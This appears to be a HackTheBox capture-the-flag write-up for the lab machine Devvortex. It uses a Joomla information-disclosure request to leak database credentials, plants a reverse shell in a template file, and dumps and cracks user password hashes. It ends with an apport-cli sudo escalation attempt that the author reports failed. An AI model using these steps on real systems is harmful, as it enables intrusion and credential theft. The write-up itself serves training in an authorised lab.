---
categories: [HackTheBox]
tags: [Joomla, Password Cracking, PrivEsc, apport-cli, mysql]
img_path: /Vulnhub-Files/img/
image:
  path: Devvortex/Untitled.png
  alt: HackTheBox Machine Devvortex ✌️
---


> HackTheBox Easy Machine [Devvortex](https://app.hackthebox.com/machines/Devvortex)
{: .prompt-tip }

## Port Scan Results ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Devvortex]
└─$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.11.242 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-27 15:27 IST
Nmap scan report for 10.10.11.242
Host is up (0.16s latency).
Not shown: 65481 closed tcp ports (reset), 37 filtered tcp ports (no-response), 15 filtered tcp ports (host-unreach)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
{: .nolineno}
{: file='Nmap_Result.txt'}

## Web Enumeration ⤵️

I checked port 80 and redirected to a domain name after setting the domain name as `devvortex.htb` I got the access for website →

![Untitled](Devvortex/Untitled%201.png)

I then again looked for another subdomain and with Tool ffuf I got a subdomain as `dev.devvortex.htb` , Lets set the `/etc/hosts` file for it and load that site →

![Untitled](Devvortex/Untitled%202.png)

Through source code I observed that this site is a CMS from `Joomla`  so I enumerated further as a Joomla CMS and got its version file →

![Untitled](Devvortex/Untitled%203.png)

Now I looked for exploit related to it and I got one →

**[Joomla! v4.2.8 - Unauthenticated information disclosure](https://www.exploit-db.com/exploits/51334)**

I ran manually and I got the credentials through it →

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Devvortex]
└─$ curl -v http://dev.devvortex.htb/api/index.php/v1/config/application?public=true
*   Trying 10.10.11.242:80...
* Connected to dev.devvortex.htb (10.10.11.242) port 80
> GET /api/index.php/v1/config/application?public=true HTTP/1.1
> Host: dev.devvortex.htb
> User-Agent: curl/8.4.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Date: Mon, 27 Nov 2023 10:29:57 GMT
< Content-Type: application/vnd.api+json; charset=utf-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< x-frame-options: SAMEORIGIN
< referrer-policy: strict-origin-when-cross-origin
< cross-origin-opener-policy: same-origin
< X-Powered-By: JoomlaAPI/1.0
< Expires: Wed, 17 Aug 2005 00:00:00 GMT
< Last-Modified: Mon, 27 Nov 2023 10:29:57 GMT
< Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
< Pragma: no-cache
< 
{"links":{"self":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true","next":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=20","last":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=60&page%5Blimit%5D=20"},"data":[{"type":"application","id":"224","attributes":{"offline":false,"id":224}},{"type":"application","id":"224","attributes":{"offline_message":"This site is down for maintenance.<br>Please check back again soon.","id":224}},{"type":"application","id":"224","attributes":{"display_offline_message":1,"id":224}},{"type":"application","id":"224","attributes":{"offline_image":"","id":224}},{"type":"application","id":"224","attributes":{"sitename":"Development","id":224}},{"type":"application","id":"224","attributes":{"editor":"tinymce","id":224}},{"type":"application","id":"224","attributes":{"captcha":"0","id":224}},{"type":"application","id":"224","attributes"* Connection #0 to host dev.devvortex.htb left intact
:{"list_limit":20,"id":224}},{"type":"application","id":"224","attributes":{"access":1,"id":224}},{"type":"application","id":"224","attributes":{"debug":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang_const":true,"id":224}},{"type":"application","id":"224","attributes":{"dbtype":"mysqli","id":224}},{"type":"application","id":"224","attributes":{"host":"localhost","id":224}},{"type":"application","id":"224","attributes":{"user":"lewis","id":224}},{"type":"application","id":"224","attributes":{"password":"<PASSWORD>","id":224}},{"type":"application","id":"224","attributes":{"db":"joomla","id":224}},{"type":"application","id":"224","attributes":{"dbprefix":"sd4fg_","id":224}},{"type":"application","id":"224","attributes":{"dbencryption":0,"id":224}},{"type":"application","id":"224","attributes":{"dbsslverifyservercert":false,"id":224}}],"meta":{"total-pages":4}}
```
{: .nolineno}

As I got the password I logged into the Joomla portal as user `lewis` →

![Untitled](Devvortex/Untitled%204.png)

Now I included the reverse shell code in `/templates/cassiopeia/error.php` file →

![Untitled](Devvortex/Untitled%205.png)

I ran the `error.php` and I got the reverse shell →

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Devvortex]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.63] from (UNKNOWN) [10.10.11.242] 60886
Linux devvortex 5.4.0-167-generic #184-Ubuntu SMP Tue Oct 31 09:21:49 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 09:08:12 up 21 min,  4 users,  load average: 0.07, 0.61, 0.60
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
logan    pts/0    10.10.16.17      08:47    1:13   0.21s  0.21s -bash
logan    pts/1    10.10.14.52      08:50   16:36   0.09s  0.09s -bash
logan    pts/2    10.10.14.52      08:52    3:24   0.28s  0.28s -bash
logan    pts/4    10.10.15.3       09:04    1.00s  0.06s  0.06s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can not access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@devvortex:/$ whoami
whoami
www-data
www-data@devvortex:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@devvortex:/$
```
{: .nolineno}

Through mysql database I got this data →

```bash
mysql> select * from sd4fg_users \G;
*************************** 1. row ***************************
           id: 649
         name: lewis
     username: lewis
        email: lewis@devvortex.htb
     password: $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u
        block: 0
    sendEmail: 1
 registerDate: 2023-09-25 16:44:24
lastvisitDate: 2023-12-04 09:40:59
   activation: 0
       params: 
lastResetTime: NULL
   resetCount: 0
       otpKey: 
         otep: 
 requireReset: 0
 authProvider: 
*************************** 2. row ***************************
           id: 650
         name: logan paul
     username: logan
        email: logan@devvortex.htb
     password: $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/changes
        block: 0
    sendEmail: 0
 registerDate: 2023-09-26 19:15:42
lastvisitDate: NULL
   activation: 
       params: {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"}
lastResetTime: NULL
   resetCount: 0
       otpKey: 
         otep: 
 requireReset: 0
 authProvider: 
2 rows in set (0.00 sec)

ERROR: 
No query specified

mysql>
```
{: .nolineno}

Now Lets crack the hash for logan and lets see if I can get the password or not I used `John The Ripper` Tool for it →

![Untitled](Devvortex/Untitled%206.png)

## SSH Shell ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Devvortex]
└─$ ssh logan@10.10.11.242                                 
The authenticity of host '10.10.11.242 (10.10.11.242)' can not be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:24: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.242' (ED25519) to the list of known hosts.
logan@10.10.11.242 ispassword: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)
...
...
logan@devvortex:~$ whoami
logan
logan@devvortex:~$ id
uid=1000(logan) gid=1000(logan) groups=1000(logan)
logan@devvortex:~$ ls -al
total 32
drwxr-xr-x 4 logan logan 4096 Dec  4 09:54 .
drwxr-xr-x 3 root  root  4096 Sep 26 19:16 ..
lrwxrwxrwx 1 root  root     9 Oct 26 14:58 .bash_history -> /dev/null
-rw-r--r-- 1 logan logan  220 Sep 26 19:16 .bash_logout
-rw-r--r-- 1 logan logan 3771 Sep 26 19:16 .bashrc
drwx------ 2 logan logan 4096 Oct 26 15:12 .cache
drwxrwxr-x 3 logan logan 4096 Dec  4 09:54 .config
-rw-r--r-- 1 logan logan  807 Sep 26 19:16 .profile
-rw-r----- 1 root  logan   33 Dec  4 09:31 user.txt
logan@devvortex:~$ cat user.txt
eb033792e4f190d86fa5dec30f37e31b
logan@devvortex:~$
```
{: .nolineno}

Now lets root this machine →

```bash
logan@devvortex:~$ sudo -l
[sudo] password for logan: 
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
logan@devvortex:~$ /usr/bin/apport-cli --help
Usage: apport-cli [options] [symptom|pid|package|program path|.apport/.crash file]

Options:
  -h, --help            show this help message and exit
  -f, --file-bug        Start in bug filing mode. Requires --package and an
                        optional --pid, or just a --pid. If neither is given,
                        display a list of known symptoms. (Implied if a single
                        argument is given.)
  -w, --window          Click a window as a target for filing a problem
                        report.
  -u UPDATE_REPORT, --update-bug=UPDATE_REPORT
                        Start in bug updating mode. Can take an optional
                        --package.
  -s SYMPTOM, --symptom=SYMPTOM
                        File a bug report about a symptom. (Implied if symptom
                        name is given as only argument.)
  -p PACKAGE, --package=PACKAGE
                        Specify package name in --file-bug mode. This is
                        optional if a --pid is specified. (Implied if package
                        name is given as only argument.)
  -P PID, --pid=PID     Specify a running program in --file-bug mode. If this
                        is specified, the bug report will contain more
                        information.  (Implied if pid is given as only
                        argument.)
  --hanging             The provided pid is a hanging application.
  -c PATH, --crash-file=PATH
                        Report the crash from given .apport or .crash file
                        instead of the pending ones in /var/crash. (Implied if
                        file is given as only argument.)
  --save=PATH           In bug filing mode, save the collected information
                        into a file instead of reporting it. This file can
                        then be reported later on from a different machine.
  --tag=TAG             Add an extra tag to the report. Can be specified
                        multiple times.
  -v, --version         Print the Apport version number.
logan@devvortex:~$
```
{: .nolineno}

This `apport-cli` is a Tool used to →

### DESCRIPTION for apport-cli Tool ⤵️

- `apport`  automatically  collects  data from crashed processes and compiles a problem report in /var/crash/.
- This is a command line frontend for reporting those crashes to the developers. It can also be used to report bugs about  pack‐ages or running processes.
- If symptom scripts are available, it can also be given the name of a symptom, or be called with just -f to display a list of known symptoms.

Lets see its version →

```bash
logan@devvortex:~$ /usr/bin/apport-cli --version
2.20.11
logan@devvortex:~$
```
{: .nolineno}

I check online and after enumeration this version is vulnerable to **[Improper Privilege Management](https://security.snyk.io/vuln/SNYK-UBUNTU2004-APPORT-5422150) ⤵️** 

> A privilege escalation attack was found in apport-cli 2.26.0 and earlier which is similar to CVE-2023-26604. If a system is specially configured to allow unprivileged users to run sudo apport-cli, less is configured as the pager, and the terminal size can be set: a local attacker can escalate privilege. It is extremely unlikely that a system administrator would configure sudo to allow unprivileged users to perform this class of exploit.
{: .prompt-info }

So here I used the crash command flag (-c) and the crash file location within which I got one random file I used it →

```bash
sudo /usr/bin/apport-cli -c /var/crash/<random_text>.crash
```
{: .nolineno}

After entering this command I would get root access but the crash file is deleted from the machine and I can’t execute this command so can’t able to get root access .

> If you have any questions or suggestions, please leave a comment below.
Thank You ! 
{: .prompt-tip }